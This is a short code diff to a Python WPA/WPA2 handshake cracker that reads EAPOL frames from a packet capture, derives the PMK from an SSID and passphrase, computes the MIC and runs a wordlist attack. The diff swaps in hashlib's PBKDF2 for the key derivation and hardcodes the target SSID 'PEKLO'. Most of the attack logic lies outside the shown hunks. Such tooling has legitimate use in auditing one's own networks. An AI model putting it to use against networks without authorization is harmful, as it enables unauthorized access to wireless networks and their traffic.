@@ -1,5 +1,4 @@
 from scapy.all import rdpcap, EAPOL
-from passlib.hash import pbkdf2_sha1
 import hmac
 import hashlib
 import argparse
@@ -14,7 +13,7 @@ def extract_wpa_key_mic(packet):
     return None
 
 def derive_pmk(ssid, passphrase):
-    return pbkdf2_sha1.using(salt=ssid, rounds=4096, keylen=32).hash(passphrase)
+    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
 
 def calculate_mic(pmk, ap_mac, cli_mac, anonce, snonce, eapol_frame):
     kck = pmk[:16]
@@ -55,7 +54,7 @@ def main():
     wordlist = args.wordlist
 
     packets = rdpcap(pcap_file)
-    ssid = "test"  # Replace with actual SSID
+    ssid = "PEKLO"  # Replace with actual SSID
 
     perform_attack(packets, ssid, wordlist)
     
